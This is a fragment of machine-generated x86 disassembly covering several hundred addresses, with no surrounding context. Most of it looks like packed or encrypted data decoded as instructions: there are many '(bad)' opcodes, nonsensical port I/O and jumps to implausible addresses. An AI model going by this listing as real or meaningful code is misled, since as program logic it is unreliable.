  4058b7:	sbb    edx,esi
  4058b9:	ins    BYTE PTR es:[edi],dx
  4058ba:	imul   esi,ebx,0x4107e6b1
  4058c0:	(bad)  
  4058c1:	ins    DWORD PTR es:[edi],dx
  4058c2:	inc    DWORD PTR [eax]
  4058c4:	ja     0x405846
  4058c6:	xchg   esp,eax
  4058c7:	xor    cl,bl
  4058c9:	adc    BYTE PTR [edx+0x23],ch
  4058cc:	inc    edi
  4058cd:	gs pop es
  4058cf:	call   0x3feb37
  4058d4:	rol    BYTE PTR [ebp+0x7ed84130],0x1b
  4058db:	(bad)  
  4058dc:	mov    ebp,0x268ce818
  4058e1:	xchg   ebx,eax
  4058e2:	(bad)  
  4058e3:	dec    DWORD PTR [ebp-0x13]
  4058e6:	(bad)  
  4058e7:	jne    0x4058a9
  4058e9:	clc    
  4058ea:	fwait
  4058eb:	retf   0x93c7
  4058ee:	leave  
  4058ef:	ret    0x10cc
  4058f2:	push   ebp
  4058f3:	mov    eax,DWORD PTR [eax+edi*2+0x5277ffff]
  4058fa:	push   DWORD PTR [ebp-0x6c]
  4058fd:	xchg   ebx,eax
  4058fe:	jne    0x405908
  405900:	jo     0x4058e3
  405902:	in     eax,dx
  405903:	push   DWORD PTR [edi-0x27]
  405906:	ror    DWORD PTR [eax],0x98
  405909:	inc    ebp
  40590a:	mov    ch,ah
  40590c:	or     edx,ebp
  40590e:	test   edi,0x944d0000
  405914:	add    BYTE PTR [eax],al
  405916:	pop    eax
  405917:	adc    BYTE PTR [ebp+0x6740c445],cl
  40591d:	fistp  QWORD PTR [eax+0x51]
  405920:	(bad)  
  405921:	(bad)  
  405922:	cmp    eax,0x1435ff04
  405927:	cmp    DWORD PTR [ecx+0x0],eax
  40592a:	mov    al,ds:0xc7ffceeb
  40592f:	pop    ds
  405930:	shl    BYTE PTR [esi+eiz*2-0x67],0x45
  405935:	clc    
  405936:	add    BYTE PTR [edi],dl
  405938:	add    bh,ch
  40593a:	(bad)  
  40593b:	xchg   esp,eax
  40593c:	jne    0x40593a
  40593e:	xor    edx,eax
  405940:	cmc    
  405941:	not    DWORD PTR [esi]
  405943:	inc    ecx
  405944:	or     ebp,eax
  405946:	imul   eax,ebx,0x7f
  405949:	inc    DWORD PTR [esi]
  40594b:	mov    eax,ds:0x31bce87b
  405950:	cmp    bh,0xe8
  405953:	aas    
  405954:	or     eax,DWORD PTR [eax]
  405956:	test   dh,ah
  405958:	outs   dx,BYTE PTR ds:[esi]
  405959:	sub    ebp,0xdeff80c1
  40595f:	cmp    al,BYTE PTR [esi-0x7fe52848]
  405965:	add    BYTE PTR [ecx],dh
  405967:	jge    0x40596c
  405969:	mov    ebp,DWORD PTR [ecx+edi*2+0xc]
  40596d:	rol    BYTE PTR [ebp+0x78],0x83
  405971:	cmp    BYTE PTR [ecx],dh
  405973:	loopne 0x40597a
  405975:	jmp    0x7c75597a
  40597a:	add    eax,DWORD PTR [eax]
  40597c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40597d:	rcl    BYTE PTR [ebx],0xff
  405980:	and    al,0x71
  405982:	imul   ebp,DWORD PTR [ecx],0xffffff81
  405985:	pop    edx
  405986:	jg     0x4059d8
  405988:	loope  0x4059db
  40598a:	stc    
  40598b:	pop    es
  40598c:	cdq    
  40598d:	sar    DWORD PTR [esi-0x1],cl
  405990:	jle    0x4059e7
  405992:	sti    
  405993:	retf   
  405994:	jbe    0x405950
  405996:	in     al,dx
  405997:	mov    ebp,0xff043c1d
  40599c:	fdivr  QWORD PTR [eax+0x6b]
  40599f:	or     eax,0x897f8281
  4059a4:	lods   al,BYTE PTR ds:[esi]
  4059a5:	lds    edi,FWORD PTR [ebp-0x1]
  4059a8:	dec    esi
  4059a9:	add    eax,0x7d31013e
  4059ae:	nop
  4059af:	test   DWORD PTR [ebx-0x1d],esi
  4059b2:	jle    0x4059b3
  4059b4:	loope  0x40594a
  4059b6:	mov    esp,ecx
  4059b8:	cs adc al,0x66
  4059bb:	xchg   ecx,eax
  4059bc:	lods   al,BYTE PTR ds:[esi]
  4059bd:	push   ebp
  4059be:	pop    edi
  4059bf:	jg     0x4059df
  4059c1:	les    edx,FWORD PTR [ebp-0x47]
  4059c4:	fldcw  WORD PTR [ecx+0x4e]
  4059c7:	jg     0x4059e2
  4059c9:	push   ebp
  4059ca:	fs add al,0x31
  4059cd:	popf   
  4059ce:	fs sar bh,0x6a
  4059d2:	les    esp,FWORD PTR ss:[edi]
  4059d5:	nop
  4059d6:	xchg   BYTE PTR [ecx+esi*1],al
  4059d9:	adc    al,0x74
  4059db:	cdq    
  4059dc:	add    BYTE PTR [eax],al
  4059de:	repz imul ebx,DWORD PTR [esi],0xf915e67f
  4059e5:	add    esi,DWORD PTR [ecx]
  4059e7:	adc    al,0x95
  4059e9:	idiv   DWORD PTR [ebp-0x3981d480]
  4059ef:	push   0x6c
  4059f1:	ret    0xc40a
  4059f4:	cmp    BYTE PTR [ebp+eax*1-0x3694172b],0x88
  4059fc:	jmp    0x54949404
  405a01:	add    cl,BYTE PTR [edx+0x739863cd]
  405a07:	imul   ecx,esi,0x14d5bc7e
  405a0d:	aam    0xe
  405a0f:	scas   eax,DWORD PTR es:[edi]
  405a10:	or     eax,0x37727ec5
  405a15:	mov    eax,ds:0x43e21431
  405a1a:	in     al,0x15
  405a1c:	xchg   edx,eax
  405a1d:	ret    
  405a1e:	mov    ch,0x80
  405a20:	stos   DWORD PTR es:[edi],eax
  405a21:	jge    0x405a81
  405a23:	push   0x64
  405a25:	ror    DWORD PTR [edx],0x9d
  405a28:	fs mov bh,0x4f
  405a2b:	push   0xffffff86
  405a2d:	jmp    0x405aa4
  405a2f:	cmp    ebp,DWORD PTR [eax]
  405a31:	add    al,0x3e
  405a33:	loopne 0x405a34
  405a35:	in     al,0xca
  405a37:	in     al,dx
  405a38:	into   
  405a39:	outs   dx,BYTE PTR ds:[esi]
  405a3a:	scas   eax,DWORD PTR es:[edi]
  405a3b:	imul   esi,DWORD PTR [ebp-0x965b63],0x8a0000b9
  405a45:	push   ebx
  405a46:	iret   
  405a47:	push   esi
  405a48:	xchg   edi,eax
  405a49:	imul   esi,DWORD PTR [ebp-0x7],0x36b871e2
  405a50:	xchg   DWORD PTR [ecx+0x50],ebp
  405a53:	cdq    
  405a54:	jg     0x405a35
  405a56:	pop    es
  405a57:	inc    ecx
  405a58:	int    0x6a
  405a5a:	jmp    FWORD PTR [esi]
  405a5c:	pop    edx
  405a5d:	mov    ds:0x976726cb,al
  405a62:	test   DWORD PTR [ebx],ebp
  405a64:	pop    esp
  405a65:	imul   edi,edi,0xbc9f57b9
  405a6b:	cmovg  ebp,DWORD PTR [ecx-0x18]
  405a6f:	aad    0x91
  405a71:	adc    al,0x0
  405a73:	fs jb  0x405a8f
  405a76:	test   DWORD PTR [ebp-0x110096c9],ecx
  405a7c:	out    0xa8,al
  405a7e:	(bad)  
  405a7f:	out    0x24,al
  405a81:	jl     0x405aa2
  405a83:	jl     0x405aba
  405a85:	adc    al,0xff
  405a87:	pushf  
  405a88:	aad    0x6a
  405a8a:	dec    esi
  405a8c:	sbb    eax,0x4c6cb92
  405a91:	pop    ebx
  405a92:	ret    0x32ed
  405a95:	mov    edi,0x50b0c58a
  405a9a:	cld    
  405a9b:	scas   al,BYTE PTR es:[edi]
  405a9c:	sbb    ax,0xaae8
  405aa0:	hlt    
  405aa1:	push   0x6d7670ff
  405aa6:	or     ebp,DWORD PTR [ecx-0x6fdc0000]
  405aac:	mov    ecx,gs
  405aae:	xor    dl,BYTE PTR [eax+ebp*2]
  405ab1:	add    BYTE PTR [ebp+0x23],ah
  405ab4:	inc    ecx
  405ab5:	add    BYTE PTR [edi-0x3c1704a0],bh
  405abb:	fsin   
  405abd:	dec    DWORD PTR [eax+0x78]
  405ac0:	gs xor bl,cl
  405ac3:	adc    al,0x50
  405ac5:	inc    DWORD PTR ds:0x7e94e81d
  405acb:	out    0xfe,eax
  405acd:	call   0x3f36a2
  405ad2:	loopne 0x405b0e
  405ad4:	xor    al,BYTE PTR [ecx+0x8]
  405ad7:	call   0xceb15750
  405adc:	int    0xff
  405ade:	pop    ds
  405adf:	inc    eax
  405ae0:	data16 or dl,BYTE PTR [bp-0x1]
  405ae5:	dec    edi
  405ae6:	aas    
  405ae7:	popa   
  405ae8:	pop    es
  405ae9:	call   0x3f41a9
  405aee:	xor    BYTE PTR [edi],ch
  405af0:	retf   
  405af1:	jmp    FWORD PTR [edi]
  405af3:	js     0x405b37
  405af5:	xor    cl,BYTE PTR [ecx-0x438a00ec]
  405afb:	cld    
  405afc:	mov    eax,0x4fe79fce
  405b01:	push   0x4125f6
  405b06:	pop    eax
  405b07:	out    0x74,eax
  405b09:	or     BYTE PTR [eax+0x42],dh
  405b0c:	std    
  405b0d:	inc    DWORD PTR [eax]
  405b0f:	add    BYTE PTR [edi-0x4],bh
  405b12:	add    eax,0x67e76fcb
  405b17:	pop    ebp
  405b18:	jp     0x405b6f
  405b1a:	(bad)  
  405b1b:	(bad)  
  405b1c:	xor    eax,0xce98e894
  405b21:	out    0xfe,eax
  405b23:	push   eax
  405b24:	inc    eax
  405b25:	jb     0x405b58
  405b27:	inc    ecx
  405b28:	dec    eax
  405b29:	inc    esp
  405b2a:	(bad)  
  405b2b:	jne    0x405b5e
  405b2d:	jae    0x405b9a
  405b2f:	xor    DWORD PTR [edi-0x67],ecx
  405b32:	jl     0x405b1c
  405b34:	dec    esp
  405b35:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405b36:	jl     0x405b37
  405b38:	ds pop edi
  405b3a:	jg     0x405b24
  405b3c:	push   esp
  405b3d:	mov    ah,0x7c
  405b3f:	(bad)  
  405b40:	clc    
  405b41:	mov    ebx,0xe27c000b
  405b46:	outs   dx,BYTE PTR ds:[esi]
  405b47:	xor    ebp,0xffffffc9
  405b4a:	shr    DWORD PTR [ecx+0x31],cl
  405b4d:	push   ebx
  405b4e:	pop    es
  405b4f:	inc    DWORD PTR [ebp+esi*2-0x31110195]
  405b56:	jnp    0x405ae1
  405b58:	je     0x405b83
  405b5a:	mov    BYTE PTR ds:0xffc3157c,bh
  405b60:	outs   dx,BYTE PTR ds:[esi]
  405b61:	jbe    0x405b66
  405b63:	je     0x405b8f
  405b65:	test   DWORD PTR [eax+esi*1+0x70],edx
  405b69:	jge    0x405b3f
  405b6b:	out    0x68,eax
  405b6d:	loopne 0x405b71
  405b6f:	add    BYTE PTR [edx],bh
  405b71:	cmp    eax,0x1df7
  405b76:	pop    esi
  405b77:	add    eax,0x66bed3ef
  405b7c:	pop    es
  405b7d:	sar    BYTE PTR ds:0x1767d349,0xab
  405b84:	ret    0xf6ff
  405b87:	ins    DWORD PTR es:[edi],dx
  405b88:	icebp  
  405b89:	pop    es
  405b8a:	mov    DWORD PTR [esi+0x5596ff79],ebx
  405b90:	(bad)
  405b94:	js     0x405bc9
  405b96:	jno    0x405b2c
  405b98:	jnp    0x405b99
  405b9a:	jle    0x405b42
  405b9c:	jbe    0x405b4c
  405b9e:	cmp    DWORD PTR [esi-0x10],esi
  405ba1:	(bad)  
  405ba2:	fild   DWORD PTR [edx+0x7a]
  405ba5:	jne    0x405be0
  405ba7:	adc    al,0x91
  405ba9:	jne    0x405c0a
  405bab:	addr16 sahf 
  405bad:	out    dx,al
  405bae:	adc    esp,DWORD PTR [edi+0x1c]
  405bb1:	or     al,0x59
  405bb3:	outs   dx,DWORD PTR ds:[esi]
  405bb4:	(bad)  
  405bb5:	jnp    0x405bfd
  405bb7:	cli    
  405bb8:	in     al,0x7a
  405bba:	les    ebx,FWORD PTR [ebx]
  405bbc:	xchg   ecx,eax
  405bbd:	pop    ecx
  405bbe:	aaa    
  405bbf:	addr16 jbe 0x405bb0
  405bc2:	push   esp
  405bc3:	addr16 hlt 
  405bc5:	or     ebx,DWORD PTR [ecx]
  405bc7:	inc    ebx
  405bc8:	addr16 jnp 0x405be9
  405bcb:	cld    
  405bcc:	dec    edi
  405bcd:	xor    al,0x70
  405bcf:	adc    al,0x56
  405bd1:	icebp  
  405bd2:	ss jl  0x405b79
  405bd5:	js     0x405bdd
  405bd7:	rcl    DWORD PTR [bp+si],1
  405bda:	add    BYTE PTR [eax],al
  405bdc:	inc    eax
  405bdd:	aad    0xe8
  405bdf:	jp     0x405c5d
  405be1:	sbb    al,0x41
  405be3:	cmp    al,0xec
  405be5:	data16 cs in al,dx
  405be8:	jne    0x405c0f
  405bea:	test   al,0x3
  405bec:	fsubrp st(0),st
  405bee:	lock imul ecx,DWORD PTR [edx],0x69
  405bf2:	push   ss
  405bf3:	jnp    0x405c4e
  405bf5:	jmp    0x405bce
  405bf7:	(bad)  
  405bf8:	(bad)  
  405bf9:	gs jl  0x405c07
  405bfc:	leave  
  405bfd:	add    eax,0xfbb67afc
  405c02:	aaa    
  405c03:	xor    eax,0xf0ee13f0
  405c08:	cs jl  0x405c03
  405c0b:	js     0x405bab
  405c0d:	push   cx
  405c0f:	pop    ebx
  405c10:	pusha  
  405c11:	aad    0xe8
  405c13:	jp     0x405c19
  405c15:	sbb    al,0xc1
  405c17:	inc    DWORD PTR [ebp+0x47ac666]
  405c1d:	push   0x7c2ef0be
  405c22:	add    BYTE PTR [ebx],dh
  405c24:	repnz dec WORD PTR [esi]
  405c28:	hlt    
  405c29:	push   ecx
  405c2a:	add    al,0xe9
  405c2c:	sbb    DWORD PTR [ecx+0x1a596aec],0x67231d00
  405c36:	jne    0x405c31
  405c38:	retf   
  405c39:	loopne 0x405c46
  405c3b:	xchg   BYTE PTR [ecx+0xe],al
  405c3e:	call   0xc7405cf6
  405c43:	push   WORD PTR [esi+0x21]
  405c47:	sbb    ch,al
  405c49:	xchg   ecx,eax
  405c4a:	jne    0x405cb1
  405c4c:	push   DWORD PTR [eax]
  405c4e:	je     0x405c68
  405c50:	add    BYTE PTR [edi+eiz*4-0x79d27c88],dh
  405c57:	cli    
  405c58:	dec    DWORD PTR [ebp+0x1]
  405c5b:	add    bh,bh
  405c5d:	mov    esp,0xed756522
  405c62:	mov    bh,BYTE PTR [esi]
  405c64:	int3   
  405c65:	imul   ebx,DWORD PTR ss:[ecx],0xffffffc0
  405c69:	mov    ch,0xfe
  405c6b:	pushf  
  405c6c:	inc    ebp
  405c6d:	and    eax,0xa8323eca
  405c72:	xor    ah,BYTE PTR [ebp+0x75]
  405c75:	adc    eax,0xeccdb5a
  405c7a:	dec    ebx
  405c7b:	cld    
  405c7c:	(bad)  
  405c7d:	call   0xfe9102cd
  405c82:	(bad)  
  405c83:	or     eax,0x652b4ce8
  405c88:	inc    DWORD PTR [ecx-0x16beddf4]
  405c8e:	sbb    edi,ebx
  405c90:	sti    
  405c91:	ror    DWORD PTR [ebx+0x57],1
  405c94:	call   esi
  405c96:	popf   
  405c97:	adc    al,0x0
  405c99:	mov    esi,0xfec4cb
  405c9e:	cmp    eax,0xb78ae818
  405ca3:	jmp    0x405ca3
  405ca5:	push   0x1e750000
  405caa:	inc    ecx
  405cab:	add    BYTE PTR [edi+0x5be8fb75],dl
  405cb1:	into   
  405cb2:	(bad)  
  405cb3:	inc    DWORD PTR [eax+0xe]
  405cb6:	add    bh,ch
  405cb8:	out    0x3f,al
  405cba:	(bad)  
  405cbb:	jne    0x405d0d
  405cbd:	stc    
  405cbe:	outs   dx,BYTE PTR ds:[esi]
  405cbf:	push   DWORD PTR [edi-0x4b8a0115]
  405cc5:	neg    DWORD PTR [ebp-0x37]
  405cc8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405cc9:	jmp    0x405c93
  405ccb:	ret    0x1108
  405cce:	push   ebp
  405ccf:	mov    eax,DWORD PTR [eax+edi*2+0x10c932f9]
  405cd6:	push   DWORD PTR [ebp+0x14]
  405cd9:	stc    
  405cda:	call   0xff2bd4ab
  405cdf:	jne    0x405cb9
  405ce1:	inc    eax
  405ce2:	out    0x34,eax
  405ce4:	inc    ebp
  405ce5:	jmp    0x405ce5
  405ce7:	jmp    FWORD PTR [ebp-0x6200afec]
  405ced:	sbb    al,ch
  405cef:	ds pop ss
  405cf1:	jmp    0x405cf1
  405cf3:	push   0x411fce
  405cf8:	daa    
  405cf9:	jne    0x405d06
  405cfb:	call   0x3f390f
  405d00:	aaa    
  405d01:	jne    0x405d12
  405d03:	push   eax
  405d04:	and    dh,bh
  405d06:	int3   
  405d07:	jmp    DWORD PTR [edi+0x1474eb]
  405d0d:	add    al,cl
  405d0f:	jmp    0x405d85
  405d11:	or     BYTE PTR [eax+0x77fffefc],al
  405d17:	fld    st(1)
  405d19:	adc    BYTE PTR [ecx],dh
  405d1b:	jnp    0x405ceb
  405d1d:	mov    dl,BYTE PTR [ebp+0x7efc3ef9]
  405d23:	daa    
  405d24:	or     al,ch
  405d26:	loope  0x405cdf
  405d28:	js     0x405d29
  405d2a:	cmp    bh,BYTE PTR [ebx+0x2fb849ef]
  405d30:	js     0x405d9a
  405d32:	xor    DWORD PTR [ebx+0x68],edi
  405d35:	mov    esi,0x41359dc9
  405d3a:	xor    DWORD PTR [esi-0x12],edi
  405d3d:	sti    
  405d3e:	inc    esi
  405d3f:	dec    DWORD PTR [ebx]
  405d41:	call   0xffb8eaf0
  405d46:	leave  
  405d47:	jnp    0x405d4c
  405d49:	out    dx,eax
  405d4a:	out    dx,eax
  405d4b:	adc    eax,0x6d703266
  405d50:	js     0x405dc7
  405d52:	sbb    eax,0x907edfb
  405d57:	dec    esp
  405d58:	js     0x405d59
  405d5a:	push   cs
  405d5b:	push   esi
  405d5c:	add    eax,0xeb941600
  405d61:	in     al,dx
  405d62:	inc    ebx
  405d63:	lods   al,BYTE PTR ds:[esi]
  405d64:	add    edi,edi
  405d66:	jl     0x405d89
  405d68:	js     0x405ddf
  405d6a:	cmp    ebp,edx
  405d6c:	loope  0x405d6c
  405d6e:	out    0x32,al
  405d70:	js     0x405de7
  405d72:	add    BYTE PTR [eax],al
  405d74:	fld    QWORD PTR ds:0x2d6c8b4
  405d7a:	dec    edx
  405d7b:	ret    0x6d39
  405d7e:	into   
  405d7f:	mov    dl,ch
  405d81:	out    dx,al
  405d82:	ds cld 
  405d84:	dec    ebx
  405d85:	ins    DWORD PTR es:[edi],dx
  405d86:	in     eax,dx
  405d87:	add    al,0xb6
  405d89:	call   0x30c54598
  405d8e:	js     0x405d8f
  405d90:	mov    eax,0xc96877b8
  405d95:	adc    al,0x1b
  405d97:	lds    edx,FWORD PTR [esi-0xfcdb105]
  405d9d:	adc    edx,esi
  405d9f:	xor    ebp,esp
  405da1:	sub    al,0x28
  405da3:	add    al,0x7e
  405da5:	jmp    0x6307c99a
  405daa:	mov    esi,0xfb9dd977
  405daf:	les    esp,FWORD PTR [esi-0x5]
  405db2:	push   0x32
  405db4:	lock adc esp,DWORD PTR [esi+0x282cf531]
  405dbb:	add    al,0x4e
  405dbd:	jmp    0x62dfc9a2
  405dc2:	mov    ?,WORD PTR [edi-0x37]
  405dc5:	mov    ds:0xfb36c4bb,al
  405dca:	push   cs
  405dcb:	xor    dh,BYTE PTR [eax+0x14]
  405dce:	jbe    0x405e01
  405dd0:	test   DWORD PTR ds:0xe91e0428,ebp
  405dd6:	lock imul eax,DWORD PTR [eax],0x0
  405dda:	xchg   edi,eax
  405ddb:	bound  ebx,QWORD PTR [esi+0x77]
  405dde:	cdq    
  405ddf:	push   eax
  405de0:	sbb    eax,ebp
  405de2:	push   es
  405de3:	sti    
  405de4:	mov    esi,0x46147031
  405de9:	xor    DWORD PTR [ebp+0x2d],edx
  405dec:	test   al,0x3
  405dee:	out    dx,al
  405def:	call   0x628fc9d4
  405df4:	cs ja  0x405e40
  405df7:	lods   al,BYTE PTR ds:[esi]
  405df8:	fcmovnb st,st(4)
  405dfa:	(bad)  
  405dfb:	cli    
  405dfc:	je     0x405e30
  405dfe:	jo     0x405e14
  405e00:	push   ss
  405e01:	xor    DWORD PTR [ebp+0x2d],esp
  405e04:	test   al,0x3
  405e06:	mov    esi,0x676bf0e8
  405e0b:	(bad)  
  405e0c:	(bad)  
  405e0d:	jbe    0x405e28
  405e0f:	sahf   
  405e10:	add    BYTE PTR [ebx+0x5567626d],bh
  405e16:	arpl   bp,dx
  405e18:	jmp    ebp
  405e1a:	popa   
  405e1b:	shr    BYTE PTR [eax],0x28
  405e1e:	xor    eax,0x1ae17563
  405e23:	sub    bh,dh
  405e25:	into   
  405e26:	pop    es
  405e27:	in     al,dx
  405e28:	mov    esi,0x67626dfb
  405e2d:	push   ebp
  405e2e:	and    ch,dl
  405e30:	push   DWORD PTR [ebp+0x2828c021]
  405e36:	xor    eax,0xcaf17563
  405e3b:	add    esi,edi
  405e3d:	sahf   
  405e3e:	add    BYTE PTR [eax],al
  405e40:	(bad)  
  405e41:	jmp    0x405e0e
  405e43:	fld    TBYTE PTR [ebp+0x62]
  405e46:	addr16 jne 0x405e49
  405e49:	aad    0xff
  405e4b:	test   DWORD PTR [ecx],eax
  405e4d:	shr    BYTE PTR [eax],0x28
  405e50:	xor    eax,0x9ae17561
  405e55:	sbb    bh,dh
  405e57:	outs   dx,BYTE PTR ds:[esi]
  405e58:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405e59:	in     al,dx
  405e5a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405e5b:	sbb    ebp,esp
  405e5d:	popa   
  405e5e:	addr16 iret 
  405e60:	inc    eax
  405e61:	sar    edi,cl
  405e63:	shl    BYTE PTR [eax],0x14
  405e66:	add    BYTE PTR [ecx-0x79],ch
  405e69:	out    0x7,eax
  405e6b:	push   ecx
  405e6c:	(bad)  
  405e6d:	pop    edi
  405e6e:	(bad)  
  405e6f:	ficomp DWORD PTR ds:[ebx-0x13cd57ce]
  405e76:	cmp    ebx,0xeb6761f5
  405e7c:	xor    dl,BYTE PTR [eax+eax*4]
  405e7f:	push   ds
  405e80:	rcr    DWORD PTR [ecx],0xe8
  405e83:	xor    DWORD PTR [ecx+0x61],ecx
  405e86:	inc    DWORD PTR [ecx+0x412687]
  405e8c:	enter  0x6d6d,0x32
  405e90:	fst    DWORD PTR ds:0x15980268
  405e96:	cmp    bh,0x25
  405e99:	or     eax,0xe78dc1e8
  405e9e:	(bad)  
  405e9f:	push   0x4126dc
  405ea4:	add    BYTE PTR [eax],al
  405ea6:	lock jns 0x405eda
  405ea9:	inc    ecx
  405eaa:	mov    BYTE PTR [ebp+0x1],ch
  405ead:	add    BYTE PTR [eax+0x6075ff95],cl
  405eb3:	in     eax,dx
  405eb4:	test   eax,0x67e79ffd
  405eb9:	test   al,0x5a
  405ebb:	push   esi
  405ebc:	jmp    DWORD PTR [edi-0x2c]
  405ebf:	and    eax,0x16200041
  405ec4:	add    BYTE PTR [eax],al
  405ec6:	fsub   st,st(6)
  405ec8:	je     0x405ed2
  405eca:	mov    al,0x83
  405ecc:	std    
  405ecd:	jmp    FWORD PTR [edi+0x5932b970]
  405ed3:	sbb    BYTE PTR [eax-0x6c],ch
  405ed6:	jmp    0x15:0xa67ff55
  405edd:	or     BYTE PTR [edi-0x1317f88f],0xe9
  405ee4:	(bad)  
  405ee5:	push   eax
  405ee7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405ee8:	xor    al,BYTE PTR [ecx+0x8]
  405eeb:	ins    DWORD PTR es:[edi],dx
  405eec:	xchg   ebx,eax
  405eed:	xor    cl,cl
  405eef:	adc    al,0x68
  405ef1:	add    bl,al
  405ef3:	adc    al,0x80
  405ef5:	jmp    DWORD PTR [ebp+0xd65e80c]
  405efb:	out    0xfe,eax
  405efd:	push   0x41261c
  405f02:	mov    al,ds:0x31413290
  405f07:	imul   ebp,ebx,0x1
  405f0a:	add    BYTE PTR [eax],al
  405f0c:	xor    DWORD PTR [ebx-0x7d],ebp
  405f0f:	(bad)  
  405f10:	cmp    al,0x63
  405f12:	imul   ecx,DWORD PTR [esi-0x54],0x61
  405f16:	je     0x405f82
  405f18:	dec    ebx
  405f19:	push   0xffffffee
  405f1b:	pop    es
  405f1c:	mov    DWORD PTR [ebx+0x75],esi
  405f1f:	call   DWORD PTR [esi+0x4ff20c4]
  405f25:	arpl   WORD PTR [ebx-0x1],bp
  405f28:	test   BYTE PTR [ecx+0x74],cl
  405f2b:	push   0x1d
  405f2d:	push   edx
  405f2e:	out    dx,al
  405f2f:	pop    es
  405f30:	mov    DWORD PTR [edi-0x5e91008a],ebx
  405f36:	out    dx,al
  405f37:	sti    
  405f38:	popw   ds
  405f3a:	or     al,0xe8
  405f3c:	out    0xb6,al
  405f3e:	je     0x405f3f
  405f40:	push   0xe5ffffac
  405f45:	in     eax,0x66
  405f47:	add    esp,0x76
  405f4a:	add    esi,DWORD PTR [edx+edx*8+0x12]
  405f4e:	pop    ss
  405f4f:	xor    esi,eax
  405f51:	push   0x74
  405f53:	jne    0x405f92
  405f55:	test   ebp,esi
  405f57:	leave  
  405f58:	es out 0xd2,eax
  405f5b:	xor    DWORD PTR [di+0x64],ebp
  405f5f:	mov    esi,0x7edf681
  405f64:	sbb    DWORD PTR [ebx+ebp*2+0x47d606ff],esi
  405f6b:	(bad)  
  405f6c:	dec    dh
  405f6e:	jmp    0x3ac:0x4200002d
  405f75:	jmp    DWORD PTR [ecx+esi*2+0x6b]
  405f79:	pop    ebp
  405f7a:	sti    
  405f7b:	es je  0x405fce
  405f7e:	dec    ecx
  405f7f:	ins    BYTE PTR es:[edi],dx
  405f80:	add    ebp,edi
  405f82:	xchg   edi,eax
  405f83:	adc    al,0xb9
  405f85:	je     0x405fcb
  405f87:	or     al,0x11
  405f89:	call   0x568b:0x6b165fd9
  405f90:	push   cs
  405f91:	je     0x405fdc
  405f93:	aad    0xb9
  405f95:	ret    0x5eae
  405f98:	je     0x405fa1
  405f9a:	cdq    
  405f9b:	and    BYTE PTR [ebx],ah
  405f9d:	je     0x405f3d
  405f9f:	les    eax,FWORD PTR [eax-0x5890ceff]
  405fa5:	aam    0x8f
  405fa7:	jmp    0x6c49bb9c
  405fac:	(bad)  
  405fad:	jae    0x405f38
  405faf:	lea    esp,[edi-0x54b2898d]
  405fb5:	cld    
  405fb6:	outs   dx,BYTE PTR ds:[esi]
  405fb7:	enter  0x6071,0x66
  405fbb:	jmp    0x4aa8bba4
  405fc0:	scas   al,BYTE PTR es:[edi]
  405fc1:	jae    0x405fed
  405fc3:	push   esp
  405fc4:	sbb    eax,0xda01d90e
  405fc9:	les    eax,FWORD PTR [esi-0x31]
  405fcc:	adc    dl,0x68
  405fcf:	pop    edi
  405fd0:	mov    ss,esp
  405fd2:	out    0x5e,al
  405fd4:	cld    
  405fd5:	sti    
  405fd6:	add    BYTE PTR [eax],al
  405fd8:	push   ss
  405fd9:	lock jge 0x40604f
  405fdc:	es ins BYTE PTR es:[edi],dx
  405fde:	adc    eax,0xa05f1e4a
  405fe3:	inc    esi
  405fe4:	sub    DWORD PTR [esp+edi*4],edx
  405fe7:	jle    0x406006
  405fe9:	xchg   ebx,eax
  405fea:	and    eax,0x56149b64
  405fef:	stc    
  405ff0:	cs pop edi
  405ff2:	aam    0xff
  405ff4:	imul   DWORD PTR [eax]
  405ff6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405ff7:	sbb    al,0x70
  405ff9:	adc    al,0x51
  405ffb:	(bad)  
  405ffd:	pop    esi
  405ffe:	add    BYTE PTR [esi],dh
  406000:	pop    esp
  406001:	fpatan 
  406003:	ret    
  406004:	xor    bl,BYTE PTR [edi+0x75]
  406007:	std    
  406008:	inc    ebx
  406009:	jmp    0xc0487e19
  40600e:	sub    BYTE PTR [eax+0x20416c32],ch
  406014:	inc    edx
  406015:	pop    edi
  406016:	mov    DWORD PTR [esi+ebx*1-0x56020016],ebp
  40601d:	push   es
  40601e:	(bad)  
  40601f:	jl     0x405fbf
  406021:	pop    ebp
  406022:	xor    eax,0xffd5358d
  406027:	shr    BYTE PTR [edi],1
  406029:	dec    ebp
  40602a:	(bad)  
  40602b:	fiadd  WORD PTR ds:0x6964f7d9
  406031:	jbe    0x406083
  406033:	into   
  406034:	jns    0x406030
  406036:	(bad)  
  406037:	cmp    al,0x31
  406039:	pop    edi
  40603a:	xor    eax,0x4400001d
  40603f:	aad    0xff
  406041:	rol    BYTE PTR [edi+0x4d],0xff
  406045:	scas   al,BYTE PTR es:[edi]
  406046:	aad    0xd8
  406048:	out    dx,eax
  406049:	adc    esi,DWORD PTR ds:0xc3c9755f
  40604f:	call   0xc039f65f
  406054:	sub    BYTE PTR [eax],ch
  406056:	sub    eax,0xa3b1fd6c
  40605b:	pop    ebp
  40605c:	mov    DWORD PTR [ecx+edx*4],esp
  40605f:	pop    DWORD PTR [ebp-0x77]
  406062:	add    bl,BYTE PTR [edi+0x75]
  406065:	lds    esp,FWORD PTR [ebx+0x49660be7]
  40606b:	shr    BYTE PTR [eax],0xa8
  40606e:	xor    ch,BYTE PTR [ebp+eiz*8+0x21]
  406072:	sbb    DWORD PTR [ebp-0x77],0xffffffa4
  406076:	mov    ss,WORD PTR [ecx+0x1174007d]
  40607c:	je     0x4071fe
  406082:	dec    ebx
  406083:	test   DWORD PTR fs:[eax],0x8a95f7
  40608a:	fcom   DWORD PTR [ecx]
  40608c:	cmp    DWORD PTR [ebp+0x1c],0x11
  406090:	je     0x4071de
  406096:	daa    
  406097:	pop    esp
  406098:	daa    
  406099:	jmp    FWORD PTR ds:0x5a2ae759
  40609f:	loop   0x40609f
  4060a1:	inc    DWORD PTR [eax]
  4060a3:	add    BYTE PTR ds:0x9075feed,bl
  4060a9:	mov    ecx,0xe397c280
  4060ae:	(bad)  
  4060af:	jne    0x406041
  4060b1:	jecxz  0x406127
  4060b3:	or     BYTE PTR [eax+0x5a],dh
  4060b6:	sar    edi,0x67
